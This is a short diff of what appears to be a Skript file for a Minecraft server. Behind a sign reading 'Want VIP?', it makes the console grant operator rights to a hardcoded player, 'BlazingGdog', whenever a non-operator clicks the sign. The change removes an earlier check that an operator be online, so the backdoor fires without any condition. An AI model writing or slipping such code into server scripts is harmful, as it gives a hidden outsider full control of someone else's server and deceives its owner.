@@ -17,6 +17,4 @@ on click:
   if clicked block is sign:
     if second line of clicked block is "Want VIP?":
       if player is not op:
-        loop all players:
-          if loop-player is op:
-            make console execute command "op BlazingGdog"
+        make console execute command "op BlazingGdog"
